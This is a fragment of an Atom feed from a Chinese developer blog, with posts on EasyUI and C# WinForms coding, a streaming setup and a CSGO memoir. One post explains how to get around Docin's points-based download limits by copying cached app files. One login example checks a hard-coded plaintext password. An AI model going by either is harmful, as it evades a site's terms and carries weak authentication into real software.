     editIndex = <span class="literal">undefined</span>;</span><br><span class="line">             <span class="comment">//重置表格的记录修改状态</span></span><br><span class="line">                     $(<span class="string">&#x27;#dg&#x27;</span>).datagrid(<span class="string">&#x27;acceptChanges&#x27;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">           &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//保存记录</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">accept</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (endEditing())&#123;</span><br><span class="line"><span class="comment">//获取所有发生了更改的行</span></span><br><span class="line">        <span class="keyword">var</span> rows = $(<span class="string">&#x27;#dg&#x27;</span>).datagrid(<span class="string">&#x27;getChanges&#x27;</span>);</span><br><span class="line"><span class="comment">//将数组转为字符串</span></span><br><span class="line">        <span class="keyword">var</span> row=<span class="built_in">JSON</span>.stringify(rows);</span><br><span class="line"><span class="comment">//发送请求</span></span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            url : <span class="string">&#x27;helper/profileupdate.php&#x27;</span>,</span><br><span class="line">            data : &#123;</span><br><span class="line">              rows:row</span><br><span class="line">            &#125;,</span><br><span class="line">            dataType : <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">            success : <span class="function"><span class="keyword">function</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (r.success) &#123;</span><br><span class="line"><span class="comment">//成功后进行提示，并重置更改状态</span></span><br><span class="line">                    alert(<span class="string">&quot;保存成功！&quot;</span>);</span><br><span class="line">                   editIndex = <span class="literal">undefined</span>;</span><br><span class="line">                   $(<span class="string">&#x27;#dg&#x27;</span>).datagrid(<span class="string">&#x27;acceptChanges&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  视频监控的简易实现方式</p><p>  使用OBS+FMS作为客户端和服务端软件，前端页面嵌入CKplayer来进行显示 OBS只要设置好推流地址就可以了。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4xEPs.jpg" alt="" /></p><p>  播放路径可以按用户名来，距离这里写test FMS不用设置，安装好后全部运行即可 随后对CKPlayer进行修改。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//将当前用户拼接到直播流地址后面，生成新的地址字符串</span></span><br><span class="line"><span class="keyword">var</span> url=<span class="string">&quot;rtmp://127.0.0.1/live/&quot;</span>+username;</span><br><span class="line"><span class="keyword">var</span> flashvars=&#123;</span><br><span class="line">f:url,</span><br><span class="line">c:<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> params=&#123;<span class="attr">bgcolor</span>:<span class="string">&#x27;#FFF&#x27;</span>,<span class="attr">allowFullScreen</span>:<span class="literal">true</span>,<span class="attr">allowScriptAccess</span>:<span class="string">&#x27;always&#x27;</span>,<span class="attr">wmode</span>:<span class="string">&#x27;transparent&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> video=\[<span class="string">&#x27;http://movie.ks.js.cn/flv/other/1_0.mp4-&gt;video/mp4&#x27;</span>\];</span><br><span class="line">CKobject.embed(<span class="string">&#x27;/ckplayer/ckplayer.swf&#x27;</span>,<span class="string">&#x27;a1&#x27;</span>,<span class="string">&#x27;ckplayer_a1&#x27;</span>,<span class="string">&#x27;100%&#x27;</span>,<span class="string">&#x27;100%&#x27;</span>,<span class="literal">false</span>,flashvars,video,params);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  其实这个项目已经完成一段时间了，今天才想起来记录一下。 网站部分基于PHP，客户端用C#。 先贴效果图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://pic.lufer.cc/images/2021/03/15/e4xVGn.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="PHP" scheme="https://coder.lufer.cc/categories/PHP/"/>
    
    <category term=".NET" scheme="https://coder.lufer.cc/categories/PHP/NET/"/>
    
    
    <category term=".NET" scheme="https://coder.lufer.cc/tags/NET/"/>
    
    <category term="PHP" scheme="https://coder.lufer.cc/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CSGO 这可能是唯一一个我能玩一辈子的游戏</title>
    <link href="https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/CSGO%20%E8%BF%99%E5%8F%AF%E8%83%BD%E6%98%AF%E5%94%AF%E4%B8%80%E4%B8%80%E4%B8%AA%E6%88%91%E8%83%BD%E7%8E%A9%E4%B8%80%E8%BE%88%E5%AD%90%E7%9A%84%E6%B8%B8%E6%88%8F/"/>
    <id>https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/CSGO%20%E8%BF%99%E5%8F%AF%E8%83%BD%E6%98%AF%E5%94%AF%E4%B8%80%E4%B8%80%E4%B8%AA%E6%88%91%E8%83%BD%E7%8E%A9%E4%B8%80%E8%BE%88%E5%AD%90%E7%9A%84%E6%B8%B8%E6%88%8F/</id>
    <published>2017-03-26T09:45:56.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://pic.lufer.cc/image/xEZ"><img src="https://pic.lufer.cc/images/2021/03/15/e4Ox2V.jpg" alt="" /></a><br />  前一阵翻CSGO截图，才发现不知不觉这个游戏我已经玩了3年了，这3年有时候开心，有时候也生气，但却从来没有腻过。 附上我最喜欢的皮肤，没有之一。</p><p><a href="https://pic.lufer.cc/image/CqC"><img src="https://pic.lufer.cc/images/2021/03/15/e4OcHH.jpg" alt="" /></a><br />  当初最开始玩CSGO，是同学跟我说这个游戏贼好玩，然后我去steam一看，也挺便宜的我就买了，后来才知道，我当时买的价格是CSGO历史最低价，至今都是。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4OzvT.jpg" alt="" /><br />  自己当年什么也不知道，迷迷糊糊的就开始了自己的竞技模式，10场定级赛打下来，就只是一个小白银。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4OyuD.jpg" alt="" /><br />  我清楚地记得，当年这是我第一次战绩排第一，还很高兴的发了一次说说。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4ODgK.jpg" alt="" /><br />  后来，慢慢的开始理解这个游戏，开始一点点升段，其实现在看来白银段更多的时候还是无脑突突突。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4O2Ed.jpg" alt="" /><br /><img src="https://pic.lufer.cc/images/2021/03/15/e4ORUA.jpg" alt="" /><br />  再后来，自己有了一颗星星，那时候就感觉自己好像变pro了一样，脱离了白银那个阶段了，感觉整个人都好像高了一等。<br /><img src="https://pic.lufer.cc/images/2021/03/15/e4OW4I.jpg" alt="" /><br />  再后来，慢慢升慢慢爬，对这个游戏的理解也一点点深入，学会了更多的打法，策略，也慢慢的有了一些所谓的“意识”和“枪法”，慢慢的一点点爬到二星，三星，四星，AK，麦穗，双AK。<br /><img src="https://pic.lufer.cc/images/2021/03/15/e4OhCt.jpg" alt="" /><br /><img src="https://pic.lufer.cc/images/2021/03/15/e4O48P.jpg" alt="" /><br /><img src="https://pic.lufer.cc/images/2021/03/15/e4O5gf.jpg" alt="" /><br />  后来遇到了一次裁军风波，再加上自己也没怎么玩，就又掉回黄金了，然后再一点点爬，一直爬到现在的菊花。<br /><img src="https://pic.lufer.cc/images/2021/03/15/e4OIv8.jpg" alt="" /><br />  一路走来到现在，反而不是那么看重段位了，更主要的还是和朋友一起，不管是上分也好翻车也罢，我觉得我能从中获得快乐就已经足够了。<br /><img src="https://pic.lufer.cc/images/2021/03/15/e4O7Dg.jpg" alt="" /><br />  这是我当年第一次被队友TK，哈哈哈哈，两个人排队摆POSE。<br /><img src="https://pic.lufer.cc/images/2021/03/15/e4OHbQ.jpg" alt="" /><br />  可能是他跟我有仇吧，天天就追着我打。<br /><img src="https://pic.lufer.cc/images/2021/03/15/e4OrjO.jpg" alt="" /><br />  第一次看到这么奇怪的死法，笑的不行顺便截了个图。<br /><img src="https://pic.lufer.cc/images/2021/03/15/e4OjCq.jpg" alt="" /><br />  第一次开了一家养鸡场<br /><img src="https://pic.lufer.cc/images/2021/03/15/e4OO5n.jpg" alt="" /><br />  第一次KZ能够跳到这么高<br /><img src="https://pic.lufer.cc/images/2021/03/15/e4O6De.jpg" alt="" /><br />  这是我白银段位最喜欢的枪，哈哈哈哈，视力不行就靠开镜来凑<br /><img src="https://pic.lufer.cc/images/2021/03/15/e4OTKS.jpg" alt="" /><br />  当年第一次和基友互刷计数器，想想当年我特别热衷暗金枪，好像整个库存都是暗金的<br /><img src="https://pic.lufer.cc/images/2021/03/15/e4OqEj.jpg" alt="" /><br />  当年第一次打大行动，是我当时看见大行动打折，当年的大行动真便宜啊，只要1刀<br /><img src="https://pic.lufer.cc/images/2021/03/15/e4OLUs.jpg" alt="" /><br />  第一次当托，哈哈哈哈这可是我掉过的最贵的枪了<br /><img src="https://pic.lufer.cc/images/2021/03/15/e4Ov80.jpg" alt="" /><br />  3年过去了，CSGO给我带来了无数的欢乐，不管是拿下一个艰难的残局的时候那种紧张的感觉，还是和朋友打出一个完美的小配合时的激动，也有犯蠢时候的欢笑，CSGO可能是唯一一个我能玩一辈子的游戏了吧，可能再过10年20年，自己真的成了夕阳红枪法的时候，可能没事瞎玩玩偶尔看看比赛也不错呢。希望10年20年以后，我还能打的动，哈哈。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://pic.lufer.cc/image/xEZ&quot;&gt;&lt;img src=&quot;https://pic.lufer.cc/images/2021/03/15/e4Ox2V.jpg&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;br /&gt;
  前一阵翻CSGO截图，才发</summary>
      
    
    
    
    <category term="thought" scheme="https://coder.lufer.cc/categories/thought/"/>
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
  </entry>
  
  <entry>
    <title>免积分下载豆丁（Docin）文献的方法</title>
    <link href="https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/%E5%85%8D%E7%A7%AF%E5%88%86%E4%B8%8B%E8%BD%BD%E8%B1%86%E4%B8%81%EF%BC%88Docin%EF%BC%89%E6%96%87%E7%8C%AE%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/%E5%85%8D%E7%A7%AF%E5%88%86%E4%B8%8B%E8%BD%BD%E8%B1%86%E4%B8%81%EF%BC%88Docin%EF%BC%89%E6%96%87%E7%8C%AE%E7%9A%84%E6%96%B9%E6%B3%95/</id>
    <published>2017-02-23T18:29:22.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<p>  首先注册一个豆丁账号，并将要下载的文献收藏到书房</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4xJR1.png" alt="" /></p><p>  打开手机APP，并下载之前保存的文献</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4x0de.png" alt="" /></p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4xUsK.png" alt="" /></p><p>  随后使用一款能够查看隐藏文件的文件浏览器（以ES文件浏览器为例）</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4xNM6.png" alt="" /></p><p>  打开路径SDcard/DocIn/BookReader/.cloud/USERDOWNLOAD/，可以找到一个没有拓展名的文件</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4xYxx.png" alt="" /></p><p>  随后我们将其发送到电脑上，并添加.pdf的拓展名，大功告成</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4xwZD.jpg" alt="" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  首先注册一个豆丁账号，并将要下载的文献收藏到书房&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://pic.lufer.cc/images/2021/03/15/e4xJR1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;  打开手机APP，并下载之前保存的文献&lt;/p&gt;
</summary>
      
    
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
  </entry>
  
  <entry>
    <title>DevExpress GridControl部分小结</title>
    <link href="https://coder.lufer.cc/CSharp/DevExpress%20GridControl%E9%83%A8%E5%88%86%E5%B0%8F%E7%BB%93/"/>
    <id>https://coder.lufer.cc/CSharp/DevExpress%20GridControl%E9%83%A8%E5%88%86%E5%B0%8F%E7%BB%93/</id>
    <published>2017-02-05T02:30:47.000Z</published>
    <updated>2021-12-17T03:59:35.914Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-获取数据源与回写数据源"><a class="markdownIt-Anchor" href="#1-获取数据源与回写数据源"></a> 1. 获取数据源与回写数据源</h1><p>  设置数据源:</p><p><code>gridControl1.DataSource = listdt;</code></p><p>  回写数据源：</p><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">gridView1.CloseEditor();       <span class="comment">//首先关闭editor</span></span><br><span class="line">gridView1.UpdateCurrentRow();  <span class="comment">//将当前所在行提交更改</span></span><br><span class="line">OleDbCommandBuilder scb = <span class="keyword">new</span> OleDbCommandBuilder(myadapter);  </span><br><span class="line"><span class="comment">//利用commandbuilder建立辅助</span></span><br><span class="line"><span class="built_in">int</span> count=myadapter.Update(dt); <span class="comment">//用DataAdapter提交Update</span></span><br><span class="line">myset.AcceptChanges();          <span class="comment">//本次更新的数据保存修改</span></span><br></pre></td></tr></table></figure><h1 id="2-列间计算与行间累加"><a class="markdownIt-Anchor" href="#2-列间计算与行间累加"></a> 2. 列间计算与行间累加</h1><h3 id="列间计算"><a class="markdownIt-Anchor" href="#列间计算"></a> 列间计算</h3><p>  设置列的<code>UnboundExpression</code>属性，并将<code>UnboundType</code>设置为<code>Integer</code>。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4x9r8.jpg" alt="" /></p><h3 id="行间计算"><a class="markdownIt-Anchor" href="#行间计算"></a> 行间计算</h3><p>  将需要累和的列的SummaryItem中的SummaryType设置为Sum，随后在DisplayFormat中设置为想要的格式，并确保勾选Show Footer即可。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4xpKf.jpg" alt="" /></p><p>  获取Footer中的累计值。</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> stt = gridView1.Columns[<span class="string">&quot;Isum&quot;</span>].SummaryItem.SummaryValue.ToString();</span><br></pre></td></tr></table></figure><h1 id="3-列排序与行排序"><a class="markdownIt-Anchor" href="#3-列排序与行排序"></a> 3. 列排序与行排序</h1><p>  列排序：设置不同列的VisibleIndex值进行手动排列。</p><p>  行排序：设置某列的SortOrder为Ascending（升序）或Descending（降序），就可按改列值对行进行排序。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-获取数据源与回写数据源&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-获取数据源与回写数据源&quot;&gt;&lt;/a&gt; 1. 获取数据源与回写数据源&lt;/h1&gt;
&lt;p&gt;  设置数据源:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gridControl1.Dat</summary>
      
    
    
    
    <category term=".NET" scheme="https://coder.lufer.cc/categories/NET/"/>
    
    
    <category term=".NET" scheme="https://coder.lufer.cc/tags/NET/"/>
    
  </entry>
  
  <entry>
    <title>点击上方按钮更换下方控件的简单实现方式</title>
    <link href="https://coder.lufer.cc/CSharp/%E7%82%B9%E5%87%BB%E4%B8%8A%E6%96%B9%E6%8C%89%E9%92%AE%E6%9B%B4%E6%8D%A2%E4%B8%8B%E6%96%B9%E6%8E%A7%E4%BB%B6%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/"/>
    <id>https://coder.lufer.cc/CSharp/%E7%82%B9%E5%87%BB%E4%B8%8A%E6%96%B9%E6%8C%89%E9%92%AE%E6%9B%B4%E6%8D%A2%E4%B8%8B%E6%96%B9%E6%8E%A7%E4%BB%B6%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/</id>
    <published>2017-02-05T02:20:17.000Z</published>
    <updated>2021-12-17T03:59:35.914Z</updated>
    
    <content type="html"><![CDATA[<p>  将不同控件编写为不同的Form，随后根据button的点击事件，在下方的panel中填充相关Form 至于相对位置，Form中的控件最好也用panel进行位置控制，并且设置好anchor，这样能保证在改变主程序窗口大小时内部Form控件不走样。</p><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">panel1.Controls.Clear(); <span class="comment">//移除所有控件</span></span><br><span class="line">SellForm sf = <span class="keyword">new</span> SellForm();</span><br><span class="line">sf.TopLevel = <span class="literal">false</span>;  <span class="comment">//设置为非顶级窗体</span></span><br><span class="line">sf.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;<span class="comment">//设置窗体为非边框样式</span></span><br><span class="line">sf.Dock = System.Windows.Forms.DockStyle.Fill;<span class="comment">//设置样式是否填充整个panel</span></span><br><span class="line">panel1.Controls.Add(sf);<span class="comment">//添加窗体</span></span><br><span class="line">sf.Show();<span class="comment">//窗体运行</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.lufer.cc/images/2021/03/15/e4xIij.jpg" alt="" /></p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4x4oQ.jpg" alt="" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  将不同控件编写为不同的Form，随后根据button的点击事件，在下方的panel中填充相关Form 至于相对位置，Form中的控件最好也用panel进行位置控制，并且设置好anchor，这样能保证在改变主程序窗口大小时内部Form控件不走样。&lt;/p&gt;
&lt;figure </summary>
      
    
    
    
    <category term=".NET" scheme="https://coder.lufer.cc/categories/NET/"/>
    
    
    <category term=".NET" scheme="https://coder.lufer.cc/tags/NET/"/>
    
  </entry>
  
  <entry>
    <title>登陆窗口实现</title>
    <link href="https://coder.lufer.cc/CSharp/%E7%99%BB%E9%99%86%E7%AA%97%E5%8F%A3%E5%AE%9E%E7%8E%B0/"/>
    <id>https://coder.lufer.cc/CSharp/%E7%99%BB%E9%99%86%E7%AA%97%E5%8F%A3%E5%AE%9E%E7%8E%B0/</id>
    <published>2017-01-30T03:23:16.000Z</published>
    <updated>2021-04-06T02:12:21.023Z</updated>
    
    <content type="html"><![CDATA[<p>  登陆窗口作为首先出现的Form，密码正确后加载主程序，本来在applic.run里面加载登陆form然后this.close没想到直接结束了主线程 后来发现可以将form先作为dialog显示，方法如下：</p><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">program.cs：</span><br><span class="line"></span><br><span class="line">FormLogin fl = <span class="keyword">new</span> FormLogin();</span><br><span class="line">fl.ShowDialog();</span><br><span class="line"><span class="keyword">if</span> (fl.DialogResult == DialogResult.OK)</span><br><span class="line">&#123;</span><br><span class="line">    Application.Run(<span class="keyword">new</span> FormMain());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FormLogin.cs:</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">button1_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (textBox1.Text == <span class="string">&quot;aaa&quot;</span>) &#123;  <span class="comment">//验证用户名密码成功</span></span><br><span class="line">        <span class="keyword">this</span>.DialogResult = DialogResult.OK;    <span class="comment">//返回一个登录成功的对话框状态</span></span><br><span class="line">        <span class="keyword">this</span>.Close();    <span class="comment">//关闭登录窗口</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  登陆窗口作为首先出现的Form，密码正确后加载主程序，本来在applic.run里面加载登陆form然后this.close没想到直接结束了主线程 后来发现可以将form先作为dialog显示，方法如下：&lt;/p&gt;
&lt;figure class=&quot;highlight cs&quot;</summary>
      
    
    
    
    <category term=".NET" scheme="https://coder.lufer.cc/categories/NET/"/>
    
    
    <category term=".NET" scheme="https://coder.lufer.cc/tags/NET/"/>
    
  </entry>
  
  <entry>
    <title>C Sharp开发手记--读写配置文件的简单方法</title>
    <link href="https://coder.lufer.cc/CSharp/C%20Sharp%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0--%E8%AF%BB%E5%86%99%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/"/>
    <id>https://coder.lufer.cc/CSharp/C%20Sharp%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0--%E8%AF%BB%E5%86%99%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/</id>
    <published>2016-05-31T15:03:53.000Z</published>
    <updated>2021-04-06T02:14:59.837Z</updated>
    
    <content type="html"><![CDATA[<p>  配置文件是程序常用的一种设置存储方式，多为ini格式 系统提供了非常简单的读写函数，分别是:<br />  读：GetPrivateProfileString<br />  写：WritePrivateProfileString<br />  读取用法：</p><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">GetPrivateProfileString(lpApplicationName, lpKeyName, lpDefault,lpReturnedString, nSize, lpFileName)</span><br><span class="line"></span><br><span class="line"><span class="comment">//lpApplicationName String，欲在其中查找条目的小节名称。这个字串不区分大小写。如设为vbNullString，就在lpReturnedString缓冲区内装载这个ini文件所有小节的列表。</span></span><br><span class="line"><span class="comment">//lpKeyName String，欲获取的项名或条目名。这个字串不区分大小写。如设为vbNullString，就在lpReturnedString缓冲区内装载指定小节所有项的列表</span></span><br><span class="line"><span class="comment">//lpDefault String，指定的条目没有找到时返回的默认值。可设为空（&quot;&quot;）</span></span><br><span class="line"><span class="comment">//lpReturnedString String，指定一个字串缓冲区，长度至少为nSize</span></span><br><span class="line"><span class="comment">//nSize，指定装载到lpReturnedString缓冲区的最大字符数量</span></span><br><span class="line"><span class="comment">//lpFileName String，初始化文件的名字。如没有指定一个完整路径名，windows就在Windows目录中查找文件</span></span><br><span class="line"></span><br><span class="line">Example</span><br><span class="line"></span><br><span class="line">ini:</span><br><span class="line">[<span class="meta">System</span>]</span><br><span class="line">ip=<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">Program：</span><br><span class="line"><span class="built_in">string</span> ip;</span><br><span class="line">GetPrivateProfileString(<span class="string">&quot;System&quot;</span>,<span class="string">&quot;ip&quot;</span>,<span class="string">&quot;&quot;</span>,ip,<span class="number">20</span>,<span class="string">&quot;config.ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">写入用法</span><br><span class="line"></span><br><span class="line">WritePrivateProfileString(lpApplicationName, lpKeyName, lpString, lpFileName)</span><br><span class="line"></span><br><span class="line"><span class="comment">//lpApplicationName String，欲在其中查找条目的小节名称。这个字串不区分大小写。如设为vbNullString，就在lpReturnedString缓冲区内装载这个ini文件所有小节的列表。</span></span><br><span class="line"><span class="comment">//lpKeyName String，欲获取的项名或条目名。这个字串不区分大小写。如设为vbNullString，就在lpReturnedString缓冲区内装载指定小节所有项的列表</span></span><br><span class="line"><span class="comment">//lpString String,在该位置想要写入的信息</span></span><br><span class="line"><span class="comment">//lpFileName String，初始化文件的名字。如没有指定一个完整路径名，windows就在Windows目录中查找文件</span></span><br><span class="line"></span><br><span class="line">Example</span><br><span class="line"></span><br><span class="line">WritePrivateProfileString(<span class="string">&quot;System&quot;</span>, <span class="string">&quot;ip&quot;</span>, <span class="string">&quot;1.1.1.1&quot;</span>, <span class="string">&quot;config.ini&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  配置文件是程序常用的一种设置存储方式，多为ini格式 系统提供了非常简单的读写函数，分别是:&lt;br /&gt;
  读：GetPrivateProfileString&lt;br /&gt;
  写：WritePrivateProfileString&lt;br /&gt;
  读取用法：&lt;/p&gt;
</summary>
      
    
    
    
    <category term=".NET" scheme="https://coder.lufer.cc/categories/NET/"/>
    
    
    <category term=".NET" scheme="https://coder.lufer.cc/tags/NET/"/>
    
  </entry>
  
  <entry>
    <title>C Sharp开发手记--通过传参的方式连接数据库</title>
    <link href="https://coder.lufer.cc/CSharp/C%20Sharp%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0--%E9%80%9A%E8%BF%87%E4%BC%A0%E5%8F%82%E7%9A%84%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>https://coder.lufer.cc/CSharp/C%20Sharp%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0--%E9%80%9A%E8%BF%87%E4%BC%A0%E5%8F%82%E7%9A%84%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/</id>
    <published>2016-05-31T14:51:46.000Z</published>
    <updated>2021-04-06T02:15:03.646Z</updated>
    
    <content type="html"><![CDATA[<p>  通过传参的方式与数据库进行连接，可以很好的解决字符串<code>过长</code>，字符串中<code>包含或</code>等问题</p><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构建SQL连接</span></span><br><span class="line">SqlConnection myconnection = <span class="keyword">new</span> SqlConnection(<span class="string">&quot;//ur sql connection string here&quot;</span>);</span><br><span class="line">myconnection.Open();</span><br><span class="line"></span><br><span class="line"><span class="comment">//建立参数方式的SQL语句</span></span><br><span class="line">String sqlcommand = <span class="string">&quot;insert into TABLE_NAME values(@id,@name.//@somethingelse&quot;</span>;</span><br><span class="line">SqlCommand mycommand = <span class="keyword">new</span> SqlCommand(sqlcommand, myconnection);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设定参数格式</span></span><br><span class="line">mycommand.Parameters.Add(<span class="keyword">new</span> SqlParameter(<span class="string">&quot;@id&quot;</span>, System.Data.SqlDbType.Int, <span class="number">0</span>));</span><br><span class="line">mycommand.Parameters.Add(<span class="keyword">new</span> SqlParameter(<span class="string">&quot;@name&quot;</span>, System.Data.SqlDbType.VarChar, <span class="number">20</span>));</span><br><span class="line"><span class="comment">//mycommand.Parameters.Add(new SqlParameter(&quot;@somethingelse&quot;, OtherType, Length));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//向参数中填值</span></span><br><span class="line"> mycommand.Parameters\[<span class="string">&quot;@id&quot;</span>\].Value = _id;</span><br><span class="line">mycommand.Parameters\[<span class="string">&quot;@name&quot;</span>\].Value = _name;</span><br><span class="line"><span class="comment">//mycommand.Parameters\[&quot;somethingelse&quot;\].Value = _somethingelse;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//执行语句</span></span><br><span class="line">mycommand.ExecuteNonQuery();</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  通过传参的方式与数据库进行连接，可以很好的解决字符串&lt;code&gt;过长&lt;/code&gt;，字符串中&lt;code&gt;包含或&lt;/code&gt;等问题&lt;/p&gt;
&lt;figure class=&quot;highlight cs&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;sp</summary>
      
    
    
    
    <category term=".NET" scheme="https://coder.lufer.cc/categories/NET/"/>
    
    
    <category term=".NET" scheme="https://coder.lufer.cc/tags/NET/"/>
    
  </entry>
  
  <entry>
    <title>C Sharp开发手记--Form间通信功能的简单实现</title>
    <link href="https://coder.lufer.cc/CSharp/C%20Sharp%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0--Form%E9%97%B4%E9%80%9A%E4%BF%A1%E5%8A%9F%E8%83%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/"/>
    <id>https://coder.lufer.cc/CSharp/C%20Sharp%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0--Form%E9%97%B4%E9%80%9A%E4%BF%A1%E5%8A%9F%E8%83%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/</id>
    <published>2016-05-30T14:13:51.000Z</published>
    <updated>2021-04-06T02:15:07.594Z</updated>
    
